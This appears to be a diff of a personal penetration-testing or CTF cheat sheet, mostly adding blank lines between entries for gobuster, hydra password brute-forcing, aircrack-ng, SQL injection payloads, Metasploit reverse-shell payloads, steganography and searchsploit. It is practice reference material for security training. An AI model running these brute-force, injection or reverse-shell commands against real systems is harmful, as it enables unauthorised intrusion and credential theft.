@@ -33,29 +33,42 @@ nmap -p 137,389,445 --script smb-os-discovery,ldap-rootdse,nbstat <IP>
 
 
 # 🌐 GOBUSTER
+
 gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
+
 gobuster dir -u http://target -w common.txt -x php,txt,html
+
 gobuster dir -u http://target -w common.txt -x zip,sql,txt
 
 
 # 🔐 HYDRA
+
 hydra -l admin -P rockyou.txt ssh://<IP>
+
 hydra -l admin -P rockyou.txt ftp://<IP>
 
 
 # 📡 AIRCRACK
+
 aircrack-ng capture.pcap
+
 aircrack-ng -w rockyou.txt capture.pcap
 
 
 # 🔎 DNS
+
 dnsrecon -d site.com -a
 
 # 🧬 CRYPTO
+
 Base64 (=) → CyberChef
+
 32 hex → MD5 → John
+
 40 hex → SHA1 → John
+
 %xx → URL → CyberChef
+
 Hex → CyberChef
 
 # 💉 SQL INJECTION
@@ -63,6 +76,7 @@ Hex → CyberChef
 " 
 `
 ' OR 1=1 --
+
 admin' --
 ' AND 1=1 --
 ' AND 1=2 --
@@ -75,38 +89,60 @@ admin' --
 ' AND SUBSTRING(database(),1,1)='d' --
 
 # 🦠 MALWARE (PE)
+
 strings sample.exe
+
 strings sample.exe | grep http
+
 md5sum sample.exe
 
 # 💣 METASPLOIT
+
 msfconsole
+
 search smb
+
 use exploit/...
+
 show payloads
+
 set RHOSTS <IP>
+
 set LHOST <IP>
+
 run
 
 linux/x86/meterpreter/reverse_tcp
+
 windows/meterpreter/reverse_tcp
+
 generic/shell_reverse_tcp
 
 # 📂 FILE
+
 file sample
+
 strings sample
 
 # 🧪 STEGO
+
 steghide extract -sf file.jpg -p password
 
 # 🔍 SEARCHSPLOIT
+
 searchsploit apache
 
 # 🎯 LOGIKA
+
 web → gobuster
+
 login → hydra / sqli
+
 hash → john
+
 exploit → metasploit
+
 file → strings
+
 wifi → aircrack
 
